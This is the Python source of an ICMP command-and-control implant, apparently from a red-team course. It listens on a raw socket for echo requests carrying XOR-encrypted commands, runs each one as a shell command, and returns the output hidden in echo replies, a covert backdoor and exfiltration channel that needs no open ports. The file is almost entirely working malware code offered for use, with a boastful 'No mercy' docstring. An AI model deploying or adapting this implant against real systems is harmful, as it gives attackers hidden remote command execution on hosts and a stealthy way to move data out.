# c2_frameworks/icmp/agent.py
"""
ICMP C2 Agent – Pure Layer 3 Implant
Listens for ICMP echo requests containing encrypted commands
Replies with ICMP echo replies containing output
No open ports. No callbacks. No mercy.
Works on Windows & Linux (requires raw sockets → run as root/admin)
"""

import os
import socket
import struct
import subprocess
import time
from datetime import datetime

from .utils import (
    generate_session_id,
    xor_data,
    build_icmp_packet,
    parse_icmp_packet,
    ICMP_ECHO_REQUEST,
    ICMP_ECHO_REPLY
)

# Windows vs Linux raw socket differences
if os.name == "nt":
    import ctypes
    from ctypes import wintypes

class ICMPAgent:
    def __init__(self, xor_key: bytes = b"30DaysRedTeam", beacon_interval: int = 300):
        self.session_id = generate_session_id()
        self.xor_key = xor_key
        self.beacon_interval = beacon_interval
        self.pending_chunks = {}  # session_id → {chunks_dict, total, received}

        print(f"[+] ICMP C2 Agent Started")
        print(f"[+] Session ID : {self.session_id}")
        print(f"[+] Platform   : {'Windows' if os.name == 'nt' else 'Linux'}")
        print(f"[+] Listening for commands via ICMP echo request...\n")

    def execute(self, cmd: str) -> bytes:
        try:
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True, timeout=180
            )
            output = result.stdout + result.stderr
            return output.encode()[:4000]  # Limit exfil size
        except Exception as e:
            return f"Exec error: {str(e)}".encode()

    def send_reply(self, dest_ip: str, seq: int, data: bytes):
        """Send encrypted output back via ICMP echo reply"""
        encrypted = xor_data(data, self.xor_key)
        packet_data = build_icmp_packet(
            icmp_type=ICMP_ECHO_REPLY,
            seq=seq,
            session_id=self.session_id,
            chunk_id=0,
            total_chunks=1,
            data=encrypted
        )

        try:
            if os.name == "nt":
                self._send_windows(dest_ip, packet_data)
            else:
                self._send_linux(dest_ip, packet_data, seq)
        except Exception as e:
            print(f"[-] Failed to send reply: {e}")

    def _send_linux(self, dest_ip: str, data: bytes, seq: int):
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        # Minimal IP header (20 bytes)
        ip_header = struct.pack("!BBHHHBBH4s4s",
            0x45, 0, len(data) + 28, 0, 0, 64, socket.IPPROTO_ICMP, 0,
            socket.inet_aton(socket.gethostbyname(socket.gethostname())),
            socket.inet_aton(dest_ip)
        )
        # Minimal ICMP header
        icmp_header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, 0, 0, seq)
        packet = ip_header + icmp_header + data
        checksum = self._checksum(packet[20:])
        icmp_header = struct.pack("!BBHHH", ICMP_ECHO_REPLY, 0, checksum, 0, seq)
        packet = ip_header + icmp_header + data
        sock.sendto(packet, (dest_ip, 0))

    def _send_windows(self, dest_ip: str, data: bytes):
        # Windows raw ICMP requires special handling via winsock
        import ctypes.wintypes
        from ctypes import windll
        ICMP = windll.iphlpapi
        buf = ctypes.create_string_buffer(data)
        ICMP.IcmpSendEcho(
            ICMP.IcmpCreateFile(),
            socket.inet_aton(dest_ip)[0],
            buf, len(data),
            None, None, 3000, 0
        )

    def _checksum(self, data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return socket.htons(~s & 0xffff)

    def handle_packet(self, packet: bytes, addr: tuple):
        ip_header = packet[0:20]
        icmp_header = packet[20:28]
        icmp_data = packet[28:]

        try:
            icmp_type, code, checksum, pid, seq = struct.unpack("!BBHHH", icmp_header)
            if icmp_type != ICMP_ECHO_REQUEST:
                return

            session_id, chunk_id, total_chunks, payload = parse_icmp_packet(icmp_data)
            decrypted = xor_data(payload, self.xor_key)

            command = decrypted.decode(errors="ignore").strip()
            if not command:
                return

            print(f"[*] Command from {addr[0]} → {command}")
            output = self.execute(command)
            self.send_reply(addr[0], seq, output)

        except Exception as e:
            print(f"[-] Packet parse error: {e}")

    def run(self):
        if os.name == "nt":
            print("[!] Windows raw ICMP requires full admin + special API calls")
            print("[!] Use Linux for reliable ICMP C2")
            return

        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)

        print("[+] ICMP listener active. Waiting for pings...\n")
        while True:
            try:
                packet, addr = sock.recvfrom(65535)
                self.handle_packet(packet, addr)
            except KeyboardInterrupt:
                print("\n[+] ICMP Agent stopped.")
                break
            except Exception as e:
                print(f"[-] Socket error: {e}")

if __name__ == "__main__":
    agent = ICMPAgent()
    agent.run()